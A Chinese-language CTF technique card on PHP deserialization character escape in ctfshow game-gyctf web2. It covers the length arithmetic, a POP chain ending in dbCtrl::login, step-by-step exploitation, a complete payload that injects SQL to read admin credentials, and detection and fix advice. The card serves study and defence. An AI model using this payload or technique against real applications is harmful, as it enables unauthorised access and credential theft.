---
id: web-php-deserialization-char-escape-pop-dbctrl-sqli
title: PHP 字符逃逸注入不可控 CtrlCase + POP 链 dbCtrl::login 任意 SQL 读取 admin 凭据
type: scenario
domain: web
path: web/php/deserialization
technique: php-char-escape-pop-chain-dbctrl-sqli
aliases:
- ctfshow game-gyctf web2
- UpdateHelper __destruct
- Info __call
- dbCtrl login
- 字符逃逸 union
- 星号逃逸
- CtrlCase 注入
- 反序列化 SQL 注入
tags:
- php
- deserialization
- character-escape
- pop-chain
- sqli
- str-replace
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V172
  verified_at: '2026-11-06T17:01:46+08:00'
  notes: 已对照原文ctfshow game-gyctf web2与图01核对：safe()替换表与净增、52*+3union=263逃逸长度、逃逸串实测263字符、POP链UpdateHelper::__destruct→User::__toString→Info::__call→dbCtrl::login(token=admin分支)均一致；SQL读取凭据后仍需正常登录取flag，卡内已注明；无sources/source_url；未在本机复跑
---

## 一句话结论

应用把用户输入先 `serialize()`、再经 `safe()` 的 `str_replace`（`*`→`hacker` 增 5、`union`→`hacker` 增 1）后 `unserialize()`；攻击者用 52 个 `*` 和 3 个 `union` 凑出 263 字节长度差，从 `nickname` 字符串逃逸出去，注入原本不可控的 `CtrlCase` 属性为 `UpdateHelper` gadget，脚本结束时沿 `UpdateHelper::__destruct → User::__toString → Info::__call → dbCtrl::login` 执行攻击者 SQL 并回显查询结果，从而读取 admin 的 id/密码哈希或构造登录条件。

## 原理

- **漏洞顺序**：`User::getNewInfo()` 先 `serialize(new Info($age,$nickname))`，再交给 `safe()` 做 `str_replace`，最后在 `User::update()` 中 `unserialize()`。替换发生在序列化之后，只改内容不更新 `s:<长度>` 声明，形成长度错位。
- **替换增量**：`safe()` 把 `union`(5)、`regexp`(6)、`load`(4)、`into`(4)、`flag`(4)、`file`(4)、`insert`(6)、`'`(1)、`\`(1)、`*`(1)、`alter`(5) 全部替换成 `hacker`(6)。净增分别为：`*`/`'`/`\` +5，`union`/`alter` +1，`flag`/`file`/`into`/`load` +2，`regexp`/`insert` 0。
- **逃逸方程**：设逃逸串长度为 L，在 `nickname` 值前放 52 个 `*`（+260）和 3 个 `union`（+3），总增量 263；再令 L=263。`unserialize` 按原始声明长度读取，读完膨胀后的前缀正好停在逃逸串开头的 `"`，随后 `;` 被当作该字符串的结束符，逃逸串剩余的 `s:8:"CtrlCase";...}` 被解析为 `Info` 的新属性，覆盖原本的 `CtrlCase;N;`。
- **不可控属性注入**：`Info::$CtrlCase` 原本由 `__construct` 之外无处赋值，攻击者通过逃逸把它设为 `UpdateHelper` 对象，从而给 POP 链提供缺失的一环。
- **POP 链**：
  - `UpdateHelper::__destruct()` 执行 `echo $this->sql;`，把 `sql` 属性（`User` 对象）当字符串输出，触发 `User::__toString()`。
  - `User::__toString()` 执行 `$this->nickname->update($this->age);`；`nickname` 设为 `Info` 对象，`Info` 没有 `update` 方法，触发 `Info::__call('update', [$age])`。
  - `Info::__call()` 执行 `$this->CtrlCase->login($argument[0]);`；`CtrlCase` 设为 `dbCtrl`，`$argument[0]` 就是 `User->age`，即攻击者 SQL。
  - `dbCtrl::login($sql)` 用 `prepare($sql)` 执行查询；payload 中 `token='admin'`，命中 `if ($this->token=='admin') return $idResult;` 分支，跳过密码校验并返回第一列，经 `Info::__call` 的 `echo` 回显。
- **为什么能读凭据**：SQL 由攻击者完全控制，且仍保留 `?` 占位符以通过 `bind_param('s',$this->name)`（`name='admin'`）。可把查询写成 `select password,id from user where username="admin"` 让第一列变成密码哈希；或写成 `select 1,"<已知md5>" from user where username=?` 让返回 id 与已知哈希匹配。拿到/构造凭据后，再走正常登录流程使 `$_SESSION['login']=1`，`update.php` 才会输出 flag。POP 链本身只负责执行 SQL 并回显结果，不直接写 session。

## 触发条件

- 存在 `unserialize()` 入口，且序列化数据在反序列化前经过会改变长度的字符串替换（本题是 `str_replace` 把短词换成更长的 `hacker`）。
- 目标类 `Info` 有一个攻击者不能直接控制的属性（`CtrlCase`），但该属性在序列化结构中位于可控属性之后，可被逃逸内容覆盖。
- 存在可串联的魔术方法：`__destruct`（起点）、`__toString`、`__call`，以及接受 SQL/命令字符串的 sink（本题 `dbCtrl::login`）。
- 攻击者知道属性名、顺序和声明长度，能精确计算逃逸串长度。
- 应用已登录或存在可访问的登录流程，用于后续使用泄露的凭据取得 flag。

## 利用步骤

1. 审计源码，确认 `serialize → safe(str_replace) → unserialize` 的顺序，列出每个被替换词的长度差。
2. 画出 POP 链：`UpdateHelper::__destruct → User::__toString → Info::__call → dbCtrl::login`，确定每个属性的对象类型。
3. 构造逃逸串：`";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:<len>:"<SQL>";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}`，并计算其长度 L。
4. 用 `*`（每个 +5）和 `union`（每个 +1）凑出净增量 L；本题 L=263，使用 52 个 `*` 与 3 个 `union`。
5. 将前缀与逃逸串作为 `nickname` 提交，同时 `age` 任意；`safe()` 替换后长度恰好补偿，`unserialize` 把 `CtrlCase` 解析为 `UpdateHelper` gadget。
6. 请求结束后析构触发 POP 链，SQL 结果随响应回显；读取 admin 密码哈希或构造登录条件后登录获取 flag。

## PoC

最终 `nickname`（前缀省略为文字说明）：

```text
nickname=************************...(52个*)unionunionunion";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}
```

逃逸串长度 263，前缀增量 52×5 + 3×1 = 263。等价的读哈希写法：

```text
age 值改为：select password,id from user where username="admin"
```

目标类关键片段：

```php
public function getNewInfo() {
    $age = $_POST['age']; $nickname = $_POST['nickname'];
    return safe(serialize(new Info($age, $nickname))); // 先序列化后替换
}
public function update() {
    $Info = unserialize($this->getNewInfo());
    // 脚本结束析构触发 POP 链
}
```

原文通过该 payload 使 `dbCtrl::login` 执行注入 SQL 并回显结果，随后登录取得 flag；未在本机复跑。

## 变体与关联

- 替换方向/函数变体：`str_ireplace`、`preg_replace`、`strtr`、HTML 实体编码等任何改变长度的后处理；长度缩短方向见 [[web-php-deserialization-str-replace-length-shortening-escape]]，变长 POP eval 见 [[web-php-deserialization-str-replace-length-lengthening-pop-eval]]。
- sink 变体：把 `dbCtrl::login` 换成任意接受字符串的 `eval`/`include`/`system` 方法；`__call` 的 `$argument[0]` 决定可控参数。
- 关联：[[web-php-deserialization-wakeup-property-count-bypass]]（另一种属性注入/绕过思路）、[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（魔术方法链基础）。
- 边界：若应用在替换后重新 `serialize()`、使用 JSON、对反序列化做签名或类白名单，路径失效。

## 检测与防御

- 检测：请求中出现大量重复的被替换词（如连续 `*`、`union`）后接 `";s:`、`O:` 等序列化结构；`nickname` 等字段长度与序列化声明不符；`unserialize` 调用点上游存在 `str_replace`/`preg_replace`。
- 修复：不要对“已序列化的用户数据”做字符串替换后再反序列化；先反序列化到受限对象/数组，校验后再序列化；使用 `unserialize($data, ['allowed_classes' => [...]])` 白名单。
- 加固：`dbCtrl::login` 不应接受外部可拼接 SQL；即使使用 prepare，也要禁止拼接/字段重排；移除 `__destruct`/`__toString`/`__call` 中的敏感 sink 与动态方法调用。
